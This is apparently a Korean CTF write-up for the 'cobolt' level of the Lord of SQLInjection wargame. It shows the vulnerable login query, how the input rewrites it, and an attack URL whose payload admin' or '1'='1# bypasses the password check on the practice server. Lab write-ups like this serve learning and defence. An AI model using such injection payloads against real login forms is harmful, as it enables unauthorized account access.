---
title: "Lord of SQLInjection: cobolt"
date: 2025-01-21
summary: ""
category: "보안/CTF 풀이"
tags: ["CTF", "웹 보안"]
sourceUrl: "https://learntoflyclotilde.tistory.com/entry/Lord-of-SQLInjection-cobolt"
draft: false
---

## **Problem**

![Lord of SQLInjection: cobolt 이미지 1](/assets/posts/los-cobolt/image-01.png)

---

## **Solve**

- **기존 구문 → GET 방식, id = admin**

```

select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')”

```

- **변경 구문**

```

select id from prob_cobolt where id='admin' or '1'='1# and pw=md5('')”

```

- **공격 구문**

```

https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin' or '1'='1#

```

---

![Lord of SQLInjection: cobolt 이미지 2](/assets/posts/los-cobolt/image-02.png)
